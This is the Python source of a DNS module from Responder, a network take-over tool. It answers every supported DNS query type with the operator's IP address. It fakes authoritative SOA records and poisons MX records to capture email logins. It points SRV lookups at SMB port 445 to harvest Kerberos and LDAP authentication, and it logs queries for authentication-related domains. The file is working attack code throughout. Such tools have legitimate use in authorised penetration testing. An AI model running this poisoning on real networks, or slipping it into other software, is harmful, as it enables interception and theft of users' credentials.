#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Features:
# - Responds to A, AAAA, SOA, MX, TXT, SRV, and ANY queries
# - SOA records to appear as authoritative DNS server
# - MX record poisoning for email client authentication capture
# - SRV record poisoning for service discovery (Kerberos, LDAP, etc.)
# - Logs interesting authentication-related domains
# - Short TTL (60s) to ensure frequent re-queries
# - IPv6 support for modern networks
#
from utils import *
import struct
import socket

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

class DNS(BaseRequestHandler):
	"""
	Enhanced DNS server for Responder
	Redirects DNS queries to attacker's IP to force authentication attempts
	"""
	
	def handle(self):
		try:
			data, socket_obj = self.request
			
			if len(data) < 12:
				return
			
			# Parse DNS header
			transaction_id = data[0:2]
			flags = struct.unpack('>H', data[2:4])[0]
			questions = struct.unpack('>H', data[4:6])[0]
			
			# Check if it's a query (QR bit = 0)
			if flags & 0x8000:
				return  # It's a response, ignore
			
			# Parse question section
			query_name, query_type, query_class, offset = self.parse_question(data, 12)
			
			if not query_name:
				return
			
			# Log the query
			if settings.Config.Verbose:
				query_type_name = self.get_type_name(query_type)
				print(text('[DNS] Query from %s: %s (%s)' % (
					self.client_address[0].replace('::ffff:', ''),
					query_name,
					query_type_name
				)))
			
			# Check if we should respond to this query
			if not self.should_respond(query_name, query_type):
				return
			
			# Build response
			response = self.build_response(
				transaction_id,
				query_name,
				query_type,
				query_class,
				data
			)
			
			if response:
				socket_obj.sendto(response, self.client_address)
				
				if settings.Config.Verbose:
					target_ip = self.get_target_ip(query_type)
					print(color('[DNS] Poisoned response: %s -> %s' % (
						query_name, target_ip), 2, 1))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[DNS] Error: %s' % str(e)))
	
	def parse_question(self, data, offset):
		"""Parse DNS question section and return domain name, type, class"""
		try:
			# Parse domain name (labels)
			labels = []
			original_offset = offset
			
			while offset < len(data):
				length = data[offset]
				
				if length == 0:
					offset += 1
					break
				
				# Check for compression pointer
				if (length & 0xC0) == 0xC0:
					# Compression pointer, stop here
					offset += 2
					break
				
				offset += 1
				if offset + length > len(data):
					return None, None, None, offset
				
				label = data[offset:offset+length].decode('utf-8', errors='ignore')
				labels.append(label)
				offset += length
			
			domain_name = '.'.join(labels)
			
			# Parse type and class
			if offset + 4 > len(data):
				return None, None, None, offset
			
			query_type = struct.unpack('>H', data[offset:offset+2])[0]
			query_class = struct.unpack('>H', data[offset+2:offset+4])[0]
			offset += 4
			
			return domain_name, query_type, query_class, offset
		
		except:
			return None, None, None, offset
	
	def should_respond(self, query_name, query_type):
		"""Determine if we should respond to this DNS query"""
		
		# Don't respond to empty queries
		if not query_name:
			return False
		
		# Respond to these query types:
		# A (1), SOA (6), MX (15), TXT (16), AAAA (28), SRV (33), ANY (255)
		supported_types = [1, 6, 15, 16, 28, 33, 255]
		if query_type not in supported_types:
			return False
		
		# Filter out WPAD queries if configured
		if not settings.Config.WPAD_On_Off:
			if 'wpad' in query_name.lower():
				return False
		
		# Check if domain is in analyze mode targets
		if hasattr(settings.Config, 'AnalyzeMode'):
			if settings.Config.AnalyzeMode:
				# In analyze mode, log but don't respond
				return False
		
		# Log interesting queries (authentication-related domains)
		query_lower = query_name.lower()
		interesting_patterns = ['login', 'auth', 'sso', 'portal', 'vpn', 'mail', 'smtp', 'imap', 'exchange', '_ldap', '_kerberos', '_gc', '_kpasswd', '_msdcs']
		if any(pattern in query_lower for pattern in interesting_patterns):
			SaveToDb({
				'module': 'DNS',
				'type': 'Interesting-Query',
				'client': self.client_address[0].replace('::ffff:', ''),
				'hostname': query_name,
				'fullhash': query_name
			})
		
		# Respond to everything
		return True
	
	def build_response(self, transaction_id, query_name, query_type, query_class, original_data):
		"""Build DNS response packet"""
		try:
			# DNS Header
			response = transaction_id  # Transaction ID
			
			# Flags: Response, Authoritative, No error
			flags = 0x8400  # Standard query response, authoritative
			response += struct.pack('>H', flags)
			
			# Questions, Answers, Authority RRs, Additional RRs
			response += struct.pack('>H', 1)  # 1 question
			response += struct.pack('>H', 1)  # 1 answer
			response += struct.pack('>H', 0)  # 0 authority
			response += struct.pack('>H', 0)  # 0 additional
			
			# Question section (copy from original query)
			# Find question section in original data
			question_start = 12
			question_end = question_start
			
			# Skip to end of domain name
			while question_end < len(original_data):
				length = original_data[question_end]
				if length == 0:
					question_end += 5  # null byte + type (2) + class (2)
					break
				if (length & 0xC0) == 0xC0:
					question_end += 6  # pointer (2) + type (2) + class (2)
					break
				question_end += length + 1
			
			question_section = original_data[question_start:question_end]
			response += question_section
			
			# Answer section
			# Name (pointer to question)
			response += b'\xc0\x0c'  # Pointer to offset 12 (question name)
			
			# Type
			response += struct.pack('>H', query_type)
			
			# Class
			response += struct.pack('>H', query_class)
			
			# TTL (short to ensure frequent re-queries)
			response += struct.pack('>I', 60)  # 60 seconds
			
			# Get target IP
			target_ip = self.get_target_ip(query_type)
			
			if query_type == 1:  # A record
				# RDLENGTH
				response += struct.pack('>H', 4)
				# RDATA (IPv4 address)
				response += socket.inet_aton(target_ip)
			
			elif query_type == 28:  # AAAA record
				# RDLENGTH
				response += struct.pack('>H', 16)
				# RDATA (IPv6 address)
				ipv6 = self.get_ipv6_address()
				response += socket.inet_pton(socket.AF_INET6, ipv6)
			
			elif query_type == 6:  # SOA record (Start of Authority)
				# Build SOA record to appear authoritative
				# SOA format: MNAME RNAME SERIAL REFRESH RETRY EXPIRE MINIMUM
				
				# MNAME (primary nameserver) - pointer to query name
				soa_data = b'\xc0\x0c'
				
				# RNAME (responsible party) - admin@<domain>
				# Format: admin.<domain> (@ becomes .)
				soa_data += b'\x05admin\xc0\x0c'  # admin + pointer to query name
				
				# SERIAL (zone serial number)
				import time
				serial = int(time.time()) % 2147483647  # Use timestamp as serial
				soa_data += struct.pack('>I', serial)
				
				# REFRESH (32-bit seconds) - how often secondary checks for updates
				soa_data += struct.pack('>I', 120)  # 2 minutes
				
				# RETRY (32-bit seconds) - retry interval if refresh fails
				soa_data += struct.pack('>I', 60)  # 1 minute
				
				# EXPIRE (32-bit seconds) - when zone data becomes invalid
				soa_data += struct.pack('>I', 300)  # 5 minutes
				
				# MINIMUM (32-bit seconds) - minimum TTL for negative caching
				soa_data += struct.pack('>I', 60)  # 60 seconds
				
				response += struct.pack('>H', len(soa_data))
				response += soa_data
				
				if settings.Config.Verbose:
					print(color('[DNS] SOA record poisoned - appearing as authoritative', 3, 1))
			
			elif query_type == 15:  # MX record (mail server)
				# Build MX record pointing to our server
				# This captures SMTP auth attempts
				mx_data = struct.pack('>H', 10)  # Priority 10
				mx_data += b'\xc0\x0c'  # Pointer to query name (our server)
				
				response += struct.pack('>H', len(mx_data))
				response += mx_data
				
				if settings.Config.Verbose:
					print(color('[DNS] MX record poisoned - potential email auth capture', 3, 1))
			
			elif query_type == 16:  # TXT record
				# Return a benign TXT record
				txt_data = b'v=spf1 a mx ~all'  # SPF record
				response += struct.pack('>H', len(txt_data) + 1)
				response += struct.pack('B', len(txt_data))
				response += txt_data
			
			elif query_type == 33:  # SRV record (service discovery)
				# SRV format: priority, weight, port, target
				# Useful for capturing Kerberos, LDAP, etc.
				srv_data = struct.pack('>HHH', 0, 0, 445)  # priority, weight, port (SMB)
				srv_data += b'\xc0\x0c'  # Target (pointer to query name)
				
				response += struct.pack('>H', len(srv_data))
				response += srv_data
				
				if settings.Config.Verbose:
					print(color('[DNS] SRV record poisoned - potential service auth capture', 3, 1))
			
			elif query_type == 255:  # ANY query
				# Respond with A record
				response += struct.pack('>H', 4)
				response += socket.inet_aton(target_ip)
			
			return response
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[DNS] Error building response: %s' % str(e)))
			return None
	
	def get_target_ip(self, query_type):
		"""Get the target IP address for spoofed responses"""
		# Use Responder's configured IP
		if query_type == 28:  # AAAA
			return self.get_ipv6_address()
		else:  # A record
			return settings.Config.Bind_To
	
	def get_ipv6_address(self):
		"""Get IPv6 address for AAAA responses"""
		# Priority 1: Use explicitly configured IPv6
		if hasattr(settings.Config, 'Bind_To_IPv6') and settings.Config.Bind_To_IPv6:
			return settings.Config.Bind_To_IPv6
		
		# Priority 2: Try to detect actual IPv6 on interface
		try:
			import netifaces
			ipv4 = settings.Config.Bind_To
			
			# Find which interface has this IPv4
			for iface in netifaces.interfaces():
				try:
					addrs = netifaces.ifaddresses(iface)
					# Check if this interface has our IPv4
					if netifaces.AF_INET in addrs:
						for addr in addrs[netifaces.AF_INET]:
							if addr.get('addr') == ipv4:
								# Found the interface, get its global IPv6
								if netifaces.AF_INET6 in addrs:
									for ipv6_addr in addrs[netifaces.AF_INET6]:
										ipv6 = ipv6_addr.get('addr', '').split('%')[0]
										# Return first global IPv6 (not link-local fe80::)
										if ipv6 and not ipv6.startswith('fe80:'):
											return ipv6
				except:
					continue
		except ImportError:
			pass
		except:
			pass
		
		# Priority 3: Use IPv4-mapped IPv6 format (::ffff:x.x.x.x)
		# This allows dual-stack clients to connect via IPv4
		try:
			ipv4 = settings.Config.Bind_To
			return '::ffff:%s' % ipv4
		except:
			pass
		
		# Last resort: return IPv6 loopback
		return '::1'
	
	def get_type_name(self, query_type):
		"""Convert query type number to name"""
		types = {
			1: 'A',
			2: 'NS',
			5: 'CNAME',
			6: 'SOA',
			12: 'PTR',
			15: 'MX',
			16: 'TXT',
			28: 'AAAA',
			33: 'SRV',
			255: 'ANY'
		}
		return types.get(query_type, 'TYPE%d' % query_type)

class DNSTCP(BaseRequestHandler):
	"""
	DNS over TCP server
	Handles TCP-based DNS queries (zone transfers, large responses)
	"""
	
	def handle(self):
		try:
			# TCP DNS messages are prefixed with 2-byte length
			length_data = self.request.recv(2)
			if len(length_data) < 2:
				return
			
			msg_length = struct.unpack('>H', length_data)[0]
			
			# Receive the DNS message
			data = b''
			while len(data) < msg_length:
				chunk = self.request.recv(msg_length - len(data))
				if not chunk:
					return
				data += chunk
			
			if len(data) < 12:
				return
			
			# Parse DNS header
			transaction_id = data[0:2]
			flags = struct.unpack('>H', data[2:4])[0]
			questions = struct.unpack('>H', data[4:6])[0]
			
			# Check if it's a query
			if flags & 0x8000:
				return
			
			# Create DNS instance to reuse parsing logic
			dns_handler = DNS.__new__(DNS)
			dns_handler.client_address = self.client_address
			
			# Parse question
			query_name, query_type, query_class, offset = dns_handler.parse_question(data, 12)
			
			if not query_name:
				return
			
			# Log the query
			if settings.Config.Verbose:
				query_type_name = dns_handler.get_type_name(query_type)
				print(text('[DNS-TCP] Query from %s: %s (%s)' % (
					self.client_address[0].replace('::ffff:', ''),
					query_name,
					query_type_name
				)))
			
			# Check if we should respond
			if not dns_handler.should_respond(query_name, query_type):
				return
			
			# Build response
			response = dns_handler.build_response(
				transaction_id,
				query_name,
				query_type,
				query_class,
				data
			)
			
			if response:
				# Prefix with length for TCP
				tcp_response = struct.pack('>H', len(response)) + response
				self.request.sendall(tcp_response)
				
				if settings.Config.Verbose:
					target_ip = dns_handler.get_target_ip(query_type)
					print(color('[DNS-TCP] Poisoned response: %s -> %s' % (
						query_name, target_ip), 2, 1))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[DNS-TCP] Error: %s' % str(e)))
